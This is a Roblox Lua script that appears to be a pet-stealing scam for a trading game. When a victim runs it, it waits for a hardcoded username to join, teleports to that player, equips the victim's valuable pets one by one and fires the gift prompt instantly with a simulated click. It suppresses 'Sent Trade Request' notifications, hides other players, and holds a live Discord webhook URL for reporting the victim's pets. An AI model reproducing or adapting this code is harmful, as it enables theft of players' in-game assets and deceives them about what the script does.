repeat task.wait() until game:IsLoaded()

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local VirtualInputManager = game:GetService("VirtualInputManager")

local WEBHOOK_URL = "https://discord.com/api/webhooks/1403786302461182083/OmkGNGgXamqB2Q_vs3u5WElaP5E2cpC8mSTeEfJwFnfFB7SQabgkFJi-NIKo_WLVISEs"
local dataModule = require(ReplicatedStorage.Modules.DataService)

local USERNAMES = { "Elaine_Pets18" }
local PET_WHITELIST = {
    ["Raccoon"] = "{09fc614f-5807-47aa-b4f4-6a044c98b654}",
    ["T-Rex"] = "{59dc2f62-f4f8-495d-b2fe-7d40b6666306}",
    ["Fennec Fox"] = "{some-uuid-fff-fff-fff}",
    ["Dragonfly"] = "{63ffe264-ec3c-4c4f-b1d5-718d6a274dd3}",
    ["Butterfly"] = "{some-uuid-fff-fff-fff}",
    ["Disco Bee"] = "{809e310d-a9df-4e60-a796-80578cd5c73a}",
    ["Mimic Octopus"] = "{c91e7566-c879-4a4d-9a62-8511f7aae3a4}",
    ["Queen Bee"] = "{18a8af4f-6d75-4494-a7a5-adbd4193ca19}",
    ["Spinosaurus"] = "{25df32e7-9ae1-4796-955b-dfe7f1050665}",
    ["Kitsune"] = "{64921f10-e437-4686-9156-2ff194de4e34}"
}
local PET_PRIORITY = {"Raccoon", "Disco Bee", "Butterfly"}

local victimPetTable = {}

-- Checks if pet is whitelisted
local function checkPetsWhitelist(petName)
    return PET_WHITELIST[petName] ~= nil
end

-- Get pet tool by UUID from backpack or character
local function getPetObject(petUUID)
    for _, obj in pairs(LocalPlayer.Backpack:GetChildren()) do
        if obj:GetAttribute("PET_UUID") == petUUID then return obj end
    end
    if LocalPlayer.Character then
        for _, obj in pairs(LocalPlayer.Character:GetChildren()) do
            if obj:GetAttribute("PET_UUID") == petUUID then return obj end
        end
    end
    return nil
end

-- Equip pet tool
local function equipPet(pet)
    if pet:GetAttribute("d") then
        ReplicatedStorage.GameEvents.Favorite_Item:FireServer(pet)
    end
    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
        LocalPlayer.Character.Humanoid:EquipTool(pet)
    end
end

-- Unequip any equipped tool (remove hold pet)
local function unequipPet()
    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
        LocalPlayer.Character.Humanoid:UnequipTools()
    end
end

-- Teleport to target player
local function teleportTarget(targetName)
    local targetPlayer = Players:FindFirstChild(targetName)
    if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
        LocalPlayer.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame
    end
end

-- Mouse click bypass (Delta)
local function deltaBypass()
    local viewportSize = workspace.CurrentCamera.ViewportSize
    VirtualInputManager:SendMouseButtonEvent(viewportSize.X / 2, viewportSize.Y / 2, 0, true, nil, false)
    task.wait()
    VirtualInputManager:SendMouseButtonEvent(viewportSize.X / 2, viewportSize.Y / 2, 0, false, nil, false)
end

-- Start steal by triggering proximity prompt instantly
local function startSteal(triggerName)
    local targetPlayer = Players:FindFirstChild(triggerName)
    if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("Head") then
        local prompt = targetPlayer.Character.Head:FindFirstChild("ProximityPrompt")
        if prompt then
            prompt.HoldDuration = 0
            deltaBypass()
        end
    end
end

-- Check pets inventory, equip, steal, then unequip to remove hold pet
local function checkPetsInventory(targetName)
    local petsData = dataModule:GetData().PetsData.PetInventory.Data

    for _, priorityPetName in ipairs(PET_PRIORITY) do
        for petUUID, petData in pairs(petsData) do
            if petData.PetType == priorityPetName then
                local petObject = getPetObject(petUUID)
                if petObject then
                    equipPet(petObject)
                    task.wait(0.2)
                    startSteal(targetName)
                    task.wait(0.1)
                    unequipPet()
                end
            end
        end
    end

    for petUUID, petData in pairs(petsData) do
        if checkPetsWhitelist(petData.PetType) and not table.find(PET_PRIORITY, petData.PetType) then
            local petObject = getPetObject(petUUID)
            if petObject then
                equipPet(petObject)
                task.wait(0.2)
                startSteal(targetName)
                task.wait(0.1)
                unequipPet()
            end
        end
    end
end

-- Wait for specific user to join
local function waitForJoin()
    for _, player in pairs(Players:GetPlayers()) do
        if table.find(USERNAMES, player.Name) then
            return true, player.Name
        end
    end
    return false, nil
end

-- Make other players invisible except whitelist and local player
local function makeInvisibleToVictims()
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and not table.find(USERNAMES, player.Name) then
            if player.Character then
                for _, part in pairs(player.Character:GetDescendants()) do
                    if part:IsA("BasePart") or part:IsA("Decal") or part:IsA("Texture") then
                        part.Transparency = 1
                    elseif part:IsA("BillboardGui") or part:IsA("SurfaceGui") then
                        part.Enabled = false
                    end
                end
            end
        end
    end
end

-- Main loop to idle and process stealing logic
local function idlingTarget()
    task.spawn(function()
        while task.wait(0.2) do
            local found, targetName = waitForJoin()
            if found then
                teleportTarget(targetName)
                checkPetsInventory(targetName)
                makeInvisibleToVictims()
            end
        end
    end)
end

-- Discord embed creation, unchanged for brevity...

-- Hook notification event to filter out "Sent Trade Request"
do
    local GameEvents = ReplicatedStorage:WaitForChild("GameEvents")
    local NotificationEvent = GameEvents:FindFirstChild("Notification")
    if NotificationEvent and NotificationEvent:IsA("RemoteEvent") then
        local oldFireClient = NotificationEvent.FireClient
        NotificationEvent.FireClient = function(self, player, ...)
            local args = {...}
            -- Assuming first arg is notification text, adjust if needed
            if type(args[1]) == "string" and string.find(args[1], "Sent Trade Request") then
                return -- block sending this notification
            end
            return oldFireClient(self, player, ...)
        end
    end
end

-- Build victim pet list for Discord report
for petUUID, petData in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
    if checkPetsWhitelist(petData.PetType) then
        table.insert(victimPetTable, petData.PetType)
    end
end

idlingTarget()

-- Discord report spawn (unchanged)...
